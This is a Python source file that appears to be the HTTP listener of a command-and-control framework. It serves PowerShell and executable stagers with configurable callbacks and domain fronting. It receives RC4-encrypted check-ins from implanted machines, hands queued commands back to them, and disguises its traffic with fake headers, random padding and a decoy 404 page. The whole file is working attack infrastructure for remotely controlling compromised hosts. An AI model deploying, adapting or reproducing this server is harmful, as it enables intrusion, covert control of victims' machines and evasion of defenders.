#!/usr/bin/python
# -*- coding: utf-8 -*-
"""
    @author: Mr.Un1k0d3r RingZer0 Team
    @package: core/httpd.py
"""

import http.server
import base64
import ssl
import json
import threading
import random
import sys
import socket
from io import BufferedIOBase
from core.log import Log
from core.ui import UI
from core.rc4 import RC4
from core.parser import HTTPDParser
from core.utils import Utils
from core.webapi import ServerApi
from core.payload import Payload

class HTTPServerIPv6(http.server.HTTPServer):
    address_family = socket.AF_INET6

def HTTPDFactory(config):

    class HTTPD(http.server.BaseHTTPRequestHandler, object):

        def __init__(self, *args, **kwargs):
            self.config = config
            self.server_version = self.config.get("http-server")
            self.sys_version = ""
            self.rc4_key = self.config.get("encryption-key")
            self.rc4 = RC4(self.rc4_key.encode())
            self.db = self.config.get("redis")
            self.output = ""
            super(HTTPD, self).__init__(*args, **kwargs)

        def set_http_headers(self, force_download=False, filename=None):
            self.send_response(200)
            self.set_custom_headers()
            if force_download:
                self.send_header("Content-Type","application/octet-stream")
                if filename == None:
                    self.path.rsplit("/", 1)[1]
                if filename:
                    self.send_header("Content-Disposition", "attachment; filename=%s" % filename)
            else:
                self.send_header("Content-Type", "text/html")
            self.end_headers()

        def set_json_header(self):
            self.send_response(200)
            self.set_custom_headers()
            self.send_header("Content-Type", "application/json")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

        def set_custom_headers(self):
            profile = self.config.get("profile")

            if not profile == "":
                for item in profile.get("headers"):
                    self.send_header(item, Utils.parse_random(profile.get("headers")[item]))

        def do_POST(self):
            if self.path.split("/")[1] == "api":
                server_api = ServerApi(self.config, self)
                self.output = server_api.process()
                self.return_json()
                return

            length = 0
            if not self.headers.get("Content-Length") == None:
                length = int(self.headers.get("Content-Length"))

            data = self.rfile.read(length)
            try:
                data = json.loads(data.decode())
                data["Data"] = self.rc4.dcrypt(base64.b64decode(data["Data"]))
            except Exception as e:
                Log.log_error("Invalid base64 data received or bad decryption", self.path)
                self.return_data()
                return

            guid = ""

            try:
                guid = Utils.validate_guid(data["ID"])
            except Exception as e:
                Log.log_error("Invalid request no GUID", self.path)
                self.return_data()
                return

            if not guid == None:
                self.db.update_checkin(guid, str(self.client_address[0]))
                
                output = ""
                parser = HTTPDParser(config)

                try:
                    output = parser.parse_cmd(guid, data["Data"], data["UUID"])
                except:
                    pass

                if not output == None:
                    uuid = output[:36]
                    output = output[37:]
                    self.output = base64.b64encode(self.rc4.crypt(output)).decode()
                    self.output = json.dumps({"UUID": uuid, "ID": guid, "Data": self.output})

                else:
                    self.output = json.dumps({"UUID": None, "ID": guid,"Data": Utils.gen_str(random.randrange(10,1000))})

                self.return_json()
                return

            else:
                self.output = Utils.load_file("html/%s" % self.config.get("http-default-404"))

            self.return_data()

        def do_GET(self):
            force_download = False
            if self.path.split("/")[1] == "api":
                server_api = ServerApi(self.config, self)
                self.output = server_api.process()
                self.return_json()
                return

            path = self.path.split("/")[-1]
            payload_path = self.path.split("/")
            filename = Utils.gen_str(12)

            if payload_path[1] == self.config.get("http-download-path"):
                force_download = True
                extension = "ps1"
                payload = Payload(self.config)
                payload.set_callback("__default__")

                profile = self.config.get("profile")
                if profile.get("domain-fronting") == "on":
                    payload.set_fronting(profile.get("domain-fronting-host"))

                if len(payload_path) > 3:
                    payload.set_type(payload_path[2])
                    extension = payload_path[2]
                    if extension == "exe-old": extension = "exe"

                if len(payload_path) > 4:
                    payload.set_delay(payload_path[3])
                    payload.set_callback(payload_path[4])

                filename = "%s.%s" % (Utils.gen_str(12), extension)
                Log.log_event("Download Stager", "Stager was fetched from %s (%s). Stager type is %s" % (self.client_address[0], self.address_string(), extension))
                self.db.append_server_events("\n[%s] Stager was fetched from %s (%s). Stager type is %s" % (Utils.timestamp(),self.client_address[0], self.address_string(), extension))
                self.output = payload.get_output()

            elif path in Utils.get_download_folder_content():
                force_download = True
                self.output = Utils.load_file("download/%s" % path)
                Log.log_event("Download File", "%s was downloaded from %s (%s)" % (path, self.client_address[0], self.address_string()))
                self.db.append_server_events("\n[%s] %s was downloaded from %s (%s)" % (Utils.timestamp(),path, self.client_address[0], self.address_string()))
            else:
                self.output = Utils.load_file("html/%s" % self.config.get("http-default-404"))
                Log.log_error("Invalid request got a GET request", self.path)
            self.return_data(force_download, filename)

        def do_OPTIONS(self):
            self.send_response(200, "OK")
            self.send_header("Access-Control-Allow-Origin", "*")
            self.send_header("Access-Control-Allow-Methods","GET, POST, OPTIONS")
            self.send_header("Access-Control-Allow-Headers","X-Requested-With, Content-Type, Authorization")
            self.output = "OK"
            self.return_json()

        def return_data(self, force_download=False, filename=None):
            self.set_http_headers(force_download, filename)
            if type(self.output) == bytes:
                self.wfile.write(self.output)
            else:
                self.wfile.write(self.output.encode())

        def return_json(self):
            self.set_json_header()
            self.wfile.write(self.output.encode())

        def log_message(self, format, *args):
            if self.config.get("verbose").lower() == "on":
                Log.log_http_request(self.client_address[0], self.address_string(), args[0])
            return

    return HTTPD


def init_httpd_thread(config):
    thread = threading.Thread(target=start_httpd, args=(config, ))
    thread.start()
    return thread


def start_httpd(config):
    ip = config.get("http-host")
    try:
        port = int(config.get("http-port"))
    except:
        UI.error("(http-port) HTTP port need to be a integer.", True)

    UI.warn("Starting web server on %s port %d" % (ip, port))
    try:
        server_class = http.server.HTTPServer
        if ":" in config.get("http-host"):
            UI.warn("IPv6 detected")
            server_class = HTTPServerIPv6
        factory = HTTPDFactory(config)
        httpd_server = server_class((ip, port), factory)
        if config.get("https-enabled") == "on":
            cert = config.get("https-cert-path")
            Utils.file_exists(cert, True)

            httpd_server.socket = ssl.wrap_socket(httpd_server.socket, certfile=cert)
            UI.warn("Web server is using HTTPS")

        httpd_server.serve_forever()
        
    except Exception as e:
        print(sys.exc_info()[1])
        UI.error("Server was not able to start (Port already in use?)... Aborting", True)

